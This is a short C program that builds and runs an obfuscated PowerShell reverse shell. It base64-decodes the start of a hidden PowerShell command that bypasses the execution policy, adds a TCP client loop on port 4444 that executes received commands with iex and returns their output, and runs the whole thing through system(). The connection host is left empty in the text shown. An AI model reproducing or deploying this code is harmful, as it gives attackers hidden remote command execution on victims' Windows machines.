#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "b64.h"

int main(int argc, char * argv[]){
        if(strstr(argv[0], argv[0]) >0){
            char *str = "cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgIiRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJw==";
            char *str3 = b64_decode(str, strlen(str));
            char str5[1024];
            snprintf(str5, sizeof(str5), "%02s',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", str3);
            system(str5);
        }
}

